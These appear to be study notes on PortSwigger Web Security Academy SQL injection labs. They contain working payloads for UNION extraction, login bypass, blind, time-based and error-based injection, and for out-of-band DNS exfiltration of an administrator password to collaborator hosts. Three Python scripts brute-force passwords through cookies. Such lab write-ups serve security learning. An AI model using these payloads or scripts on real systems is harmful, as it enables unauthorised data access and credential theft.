- [What is a SQL injection?](#What%20is%20a%20SQL%20injection?)
- [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data)
- [SQL injection vulnerability allowing login bypass](#SQL%20injection%20vulnerability%20allowing%20login%20bypass)
- [SQL injection attack, querying the database type and version on Oracle. SQL injection attack, querying the database type and version on MySQL and Microsoft](#SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle.%20SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft)
	- [MySQL](#MySQL)
		- [1. First of all you have to know the quantities of columns in the table](#1.%20First%20of%20all%20you%20have%20to%20know%20the%20quantities%20of%20columns%20in%20the%20table)
		- [2. Obtain the database names](#2.%20Obtain%20the%20database%20names)
		- [3. Obtain the tables of a database](#3.%20Obtain%20the%20tables%20of%20a%20database)
		- [4. Obtain the columns](#4.%20Obtain%20the%20columns)
		- [5. Obtain the data](#5.%20Obtain%20the%20data)
	- [Oracle](#Oracle)
- [SQL injection attack, listing the database contents on non-Oracle databases](#SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases)
- [SQL injection attack, listing the database contents on Oracle](#SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle)
- [SQL injection UNION attack, determining the number of columns returned by the query](#SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query)
- [SQL injection UNION attack, finding a column containing text](#SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text)
- [SQL injection UNION attack, retrieving data from other tables](#SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables)
- [SQL injection UNION attack, retrieving multiple values in a single column](#SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column)
- [Blind SQL injection with conditional responses](#Blind%20SQL%20injection%20with%20conditional%20responses)
- [Blind SQL injection with conditional errors](#Blind%20SQL%20injection%20with%20conditional%20errors)
- [Visible error-based SQL injection](#Visible%20error-based%20SQL%20injection)
- [Blind SQL injection with time delays](#Blind%20SQL%20injection%20with%20time%20delays)
- [Blind SQL injection with time delays and information retrieval](#Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval)
- [SQL injection with out-of-band interaction | SQL injection OOB](#SQL%20injection%20with%20out-of-band%20interaction%20%7C%20SQL%20injection%20OOB)
- [Blind SQL injection with out-of-band data exfiltration](#Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration)
- [SQL injection with filter bypass via XML encoding](#SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding)
- [Bypass filters](#Bypass%20filters)
- [Tips](#Tips)
- [Cheatsheets](#Cheatsheets)


---

# What is a SQL injection?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. **This can allow an attacker to view data that they are not normally able to retrieve**. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform **denial-of-service attacks**.

Source [Portswigger](https://portswigger.net/web-security/sql-injection).

---

# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

If you can control the content of where clause and is not well sanitized, you can escape with `'` and inject sql code.

How to obtain all the products:
```sql
select * from products where category = 'test' or 1=1-- - ' and released = 1
```

You obtain all the products because the condition 1=1-- - is **true**, don't filter by category and show all the products thanks to the asterisk. Then comment the final part of the query so that it doesn't give any error.

# SQL injection vulnerability allowing login bypass

We have the name of a username(administrator), but we don't know the password, but we find that the login panel is vulnerable to a sql injection,

```sql
password' or 1=1-- -
```

# SQL injection attack, querying the database type and version on Oracle. SQL injection attack, querying the database type and version on MySQL and Microsoft

The union attack is useful to obtain data of the database, know the engineer and version of the database.

## MySQL
### 1. First of all you have to know the quantities of columns in the table

You can use **order by** clause to know the exact numbers of columns in the table:

```
...' order by 2-- -
```

You can control what do you want to show, MySQL example:
```mysql
...' union select "test",@@version-- -
```

the first input is "test" is for the first column, and the second column obtain the version. If only return one result and the column have more data, they fill all the column with the same data. You can test numbers, null. functions... Sometimes union select don't work and return an error.

Some functions in MySQL:

- user()
- database()

Most of the time this information is show in some part of the web, but sometimes doesn't show and you have to play blind
### 2. Obtain the database names

In MySQL with `database()` you can obtain the database that is using, but if you want to know all you can use this command:

```mysql
...' union select "test",schema_name from information_schema.schemata-- -
```

Other times you can't see all the names of the databases, for example because doesn't exist enought fields of data to show the name of databases. 
You can play with **groupconcat()** (join several rows in a string) function or **concat()** (join different values in one sring inside a row) and show all in the same field.

```mysql
...' union select "test",group_concat(schema_name) from information_schema.schemata-- -
```

You can concadenate with double pipe `||`

```mysql
' union select username || '-> ' || password from users-- -
```

You can use **limit** but is very slow:

```mysql
...' union select "test",schema_name from information_schema.schemata limit 0,1-- -
```

You can iterate 1,1 2,1

### 3. Obtain the tables of a database

When you found the database that you want to inspect, you can obtain the table names:

```mysql
...' union select "test",group_concat(table_name) from information_schema.tables where table_schema='login'-- -
```

### 4. Obtain the columns

You have the database, you have the table now you want to know what columns exists.

```mysql
...' union select "test",group_concat(column_name) from information_schema.columns where table_schema='login' and table_name='users'-- -
```

### 5. Obtain the data

Finally you see the user and password fields, you're fired up to see the data, you just have to run this query:

```mysql
...' union select "test",group_concat(username,":",password) from login.users-- -
```

If the database is the one that is running you don't have to indicate the name of database(login).

## Oracle

If you're dealing with a Oracle database you see that union select x,x give an error, this is because in Oracle you always have to reference a table.

```oracle
...' union select 'a','b' from dual-- -
```

For obtain the version you can use this query:
```oracle
...' union select 'a',banner from v$version-- -
```

# SQL injection attack, listing the database contents on non-Oracle databases

Do the basic SQLi, check with a quote if is vulnerable, use order by to discver the columns, discover the databases,tables,column and the password of administrator user.

# SQL injection attack, listing the database contents on Oracle

When you want to extract or obtain information in a Oracle database you have to follow the same methodology but with another syntaxis, you can follow some Cheatsheet.

First of all check if is vulnerable, use the quote.
1. Then use order by to check the columns.
2. Use union select but you see that give you an error, with numbers, with null, with strings... You have to indicate the dual table.

```
' union select 'a','b' from dual-- -
```

3. In Oracle you only have one Database instance, then you have to obtain the tables.

```
' union select NULL,table_name from all_tables-- -
```

4. Obtain the columns of the table

```
' union select NULL,column_name from all_tab_columns where table_name='USERS_NKSROM'-- -
```

5. Obtain the data.

```
' union select USERNAME_OKUQCM,PASSWORD_TBPKBA from USERS_NKSROM-- -
```

# SQL injection UNION attack, determining the number of columns returned by the query

```sql
' union select NULL,NULL,NULL-- -
```

# SQL injection UNION attack, finding a column containing text

```sql
'union select NULL,'wn3joN',NULL-- -
```

# SQL injection UNION attack, retrieving data from other tables

Repeat again the methodology of SQLi, obtain the database, tables, columns, data.

# SQL injection UNION attack, retrieving multiple values in a single column

You can use group_concat(),concat() 0x3a in place of colon(:), double pipe, try hexadecimal names... 0x...

```mysql
' union select NULL,username || ' -> ' || password from public.users-- -
```

# Blind SQL injection with conditional responses

You don't see the result of the SQL in the website but you can observate the behaviour of the web and see if something change if the query is true or false.

You detect that exist a trackId cookie and there is a possibility that he is using a sql query.

You start testing with a quote, in developer tools for example or burp and you detect something different in the website, the message Welcome back! disappear. Then you start with the recognition seen above.

1. Detect TrackingId cookie like possible sql injection.
2. Test with a quote
3. Use order clause
4. Use union select clause with number(doesn't work because the message welcome back doesn't appear).
5. Use union select caluse with null, works the message appear.
6. Try to inject some text and see that the message appear, but the text is not reflected in the website. Now you know that is a **Blind SQLi**
7. You discard that the database engineer is Oracle because the message welcome back appear without indicate any table.
8. In resumen, we have a way to identify when something is valid or not, this is thanks to the message appearing and disappearing.
9. We can use a nestead query to discover charactars

```sql
' and (select 'a' from users where username='administrator')='a' -- -
```

In the nestead query we are doing the following:
Return me an 'a' if the user 'administrator' exist. But we know the username, but ¿if we don't know?¿We can do a bruteforce of users but is the best option? No.

10. Using substring to discover new characters

Now with substring you can indicate that you want to obtain the first character of the user administrator(if exists), then if return an 'a' and is equal to an 'a' the message appear.
```sql
' and (select substring(username,1,1) from users where username='administrator')='a'-- -
```

Sintax of substring(string, start_position, length)

11. Obtaining the password

```sql
' and (select substring(password,1,1) from users where username='administrator')='p'-- -
```

If you want to automatice this you can use the intruder(recommended burp pro) or python scripting.

12. Automate with burp or python scripting

For discover the full password you have to iterate with substring start parameter and the comparing character, you can create a python script.

13. The first of all is discover the length of the password, to do this, we can use this query:

```sql
' and (select 'a' from users where username='administrator' and length(password)>=20)='a'-- -
```

14. Script in python:

```python
#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import requests
import sys
import signal
import string
import time
import threading

def def_handler(sig, frame):
    print(colored(f"\n[+] Saliendo... [+]", 'red'))
    p1.failure("Parando ataque de fuerza bruta")
    sys.exit(1)

# Ctrl_c
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLI")
def makeSQLI():
   
    p2 = log.progress("PASSWORD")
    
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    for position in range(1, 21):
        for character in characters:
            cookies = {
                    'TrackingId': f"FcOph0enFWnxemAV' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
                    'session': "iLICSZkafysiGkOybMPe1y2QKWqEdrp2"
                    }

            p1.status(cookies["TrackingId"])
            
            r = requests.get("https://0af000cc04a4b54a8102e3be003000bd.web-security-academy.net/", cookies=cookies)
            
            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLI()

```

# Blind SQL injection with conditional errors

You based in the status code of the webpage.

Test with a quote, discover the columns, union select don't work, test with Oracle(from dual)

To concadenate strings in Oracle you can use:

```sql
'||(select 'a' from dual)||
```

The way to discover things is using when() clause.

```sql
' || (select case when(1=1) then to_char(1/0) else '' end from dual) || '
```

When the condition is true(1=1) do to_char(1/0) causing an error(500 status code).
When the condition is false(2=1) go to else and don't do anything(200 status code).

Now we want to obtain information.

```sql
' || (select case when(1=1) then to_char(1/0) else '' end from users where username='administrator') || '
```

When the query is valid return the row(data) and do to_char(1/0).
When the user is not valid the query don't execute because doesn't have data.

Obtain the length of the password:

```sql
' || (select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator') || '
```

We know that the user administrator exist, then check if the length of the password is 20.

The query to discover characters is substr(), you can check if use username field(is more faster because you know the name) in place of password:

```sql
' || (select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator') || '
```

Automate with a python script:
```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
import string
from termcolor import colored
from pwn import *

def signal_handler(sig, frame):
    print(colored("\n\n[+] Chao:o", 'red'))
    p_sqli.failure("Something went wrong")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Global variables
URL = 'https://0aa00018033ab6dd8001170000ee00ec.web-security-academy.net/'
CHARACTERS = string.ascii_lowercase + string.digits

p_sqli = log.progress("SQLi")
p_password = log.progress("Password")

def sqli_run():
    password = ''

    p_sqli.status("Starting bruteforce attack...")
    time.sleep(1)

    for position in range(1,21):
        for character in CHARACTERS:

            cookies = {
                'TrackingId': f"nzMHHQhXkdTYY9uO' || (select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator') || '",
                'session': "K1IX48AWjYlcP5CeuUhRgxbwxtdMmoPx"
                }
            
            p_sqli.status(cookies['TrackingId'])
            response = requests.get(URL, cookies=cookies)
   
            if response.status_code == 500:
                password += character
                break

        p_password.status(password)

if __name__ == '__main__':
    sqli_run()
```

# Visible error-based SQL injection

The error is visible in the website

We can take advatage of the fact that we see the error to create an error that show the password:

```sql
' or 1=cast((select password from users limit 1) as INT)-- -
```

You can use cast() function an a nestead query to try to convert the string obtained in a INT(number) and cause an error.

If you try use 1=1-- -, 2=1-- - you see that the status code is the same, this means that you can't check 'a'='a' and compare characters as we have seen above.

# Blind SQL injection with time delays

Sometimes you try all and you don't found and see nothing. You can try time based injection to discover what type of engine is using you have the [cheatsheet of Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

In this case the database is postgress

```postgresql
H1mizzhfFww2LwyK'||pg_sleep(10)-- -
```

Remember you have to concadenate the sleep, in postgre is with `||`

# Blind SQL injection with time delays and information retrieval

When you try all and you see that doesn't respond with nothing you can try to use or sleep(5), pg_sleep(5)... With this example you're creating a new query.
```postgresql
'; select pg_sleep(5)-- -
```

But before send the request you have to url encode the semicolon because the browser think that you're indicating another type of cookie.
```postgresql
'%3b select pg_sleep(5)-- -
```


```postgresql
'%3b select case when(1=1) then pg_sleep(5) else pg_sleep(0)-- -
```

If the user administrator exist the webpage will take 5 seconds
```postgresql
'%3b select case when(username='administrator') then pg_sleep(5) else pg_sleep(0) end from users-- -
```

Obtain the length of the password.
```postgresql
'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- -
```

How obtain data(very similar to blind conditional response and error.) 
```postgresql
'%3b select case when(username='administrator' and substring(password,1,1)='3') then pg_sleep(5) else pg_sleep(0) end from users-- -
```

Create python script:

```python
#!/usr/bin/env python3

import sys
import signal
import string
import time
import requests
from termcolor import colored
from pwn import *

URL = 'https://0a5a00930348319c819766610007008c.web-security-academy.net/'
CHARACTERS = string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")
p2 = log.progress("Password")

def event_handler(sig, frame):
    print(colored("\n\n [+] Exiting...", "red"))
    sys.exit(0)

signal.signal(signal.SIGINT, event_handler)

def run_sqli():

    password = ''
    p1.status("Starting bruteforce attack...")
    time.sleep(2)

    for position in range(1,21):
        for character in CHARACTERS:
            cookies = {
                    'TrackingId': f"'%3b select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users-- -",
                    'session': "FKugbhkg9pHK2pqwN99h7sWtZ3s9fTbA"
                    }

            p1.status(cookies["TrackingId"])
            time_start = time.time()
            r = requests.get(URL, cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 3:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    run_sqli()

```

In case that was a mysql the sintax be like:

```sql
select username from users where id = '' or if(substr(database(),1,1)='a', sleep(5),sleep(0))-- -
```

```sql
select username from users where id = '' or if(substr((select password from users where username='administrator'),1,1)='a', sleep(5),sleep(0))-- -
```

# SQL injection with out-of-band interaction | SQL injection OOB

When nothing work, not event the time based inyection, you can try a OOD SQL Inyection. This is possible because the database have  activate the access to external resources(DNS, HTTP, SMB...). If you open the [cheatsheet of Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) in DNS lookup you find this query:

```oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Changes to-do in the query:
- Add the union clause
- Comment semicolons `;` and percents `%`
- Add the Collaborator(Burp pro)
- Check the collaborator and click on button "Poll now", you have to receive somes dns lookup.

```oracle
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://skg17sprvajp3xd2p9i7ib1e85ew2mqb.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
```

This technique is a XXE Out-of-Band (OOB)

# Blind SQL injection with out-of-band data exfiltration

Now if we want to exfiltrate information throught dns?

If you set this query, you see that you can add subdomains to the url, the idea is take advantage of that creating a query

```oracle
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://test.kwk6v6jjb8t6l3nzymqv9a90jrpid81x.oastify.com/"> %25remote%3b]>'),'/l') FROM dual -- -
```

And this is the way to create a query in the subdomain, you have to concadenate with pipes ||, then add '' and use a nestead query:
```oracle
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select username from users where username='administrator')||'.kwk6v6jjb8t6l3nzymqv9a90jrpid81x.oastify.com/"> %25remote%3b]>'),'/l') FROM dual -- -
```

When you see the collaborator you see that is interpreted.

Now the same but with the password:

```oracle
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select password from users where username='administrator')||'.kwk6v6jjb8t6l3nzymqv9a90jrpid81x.oastify.com/"> %25remote%3b]>'),'/l') FROM dual -- -
```

# SQL injection with filter bypass via XML encoding

You have hackvertor extension in Burpsuite, that allow you to convert the selected code to differents format, this is very useful to bypass WAF.

For example, in this lab, we are using a sql injection thorough xml, but there is a WAF, to avoid this waf, you can use the extension, go to -> extensions > hackvertor > encode > hex_entities

And automatically add hex_entities tag. 
In this case we discover the sql injection without a quot because the query don't use quotes and we don't have to close nothing.
```xml
<@hex_entities>
3 union select 1
</@hex_entities>
```

```xml
<@hex_entities>
3 union select username||':'||password from users
</@hex_entities>
```

---

# Bypass filters

Sometimes you put clear text in your query and some protection block your request. If you want to "hidde" the text you can use hexadecimal

```bash
echo -n "table_name" | xxd -p
```

In the query:
```sql
...' union select NULL,group_concat(table_name) from information_schema.tables where table_schema=0x7461626c655f6e616d65-- -
```

You can put colon `:` in hexadecimal -> 0x3a

---

# Tips

- Sometimes work if delete the original value of the injection, ex: 123456' or 1=1-- - -> 'or 1=1-- -

---

# Cheatsheets
- https://portswigger.net/web-security/sql-injection/cheat-sheet
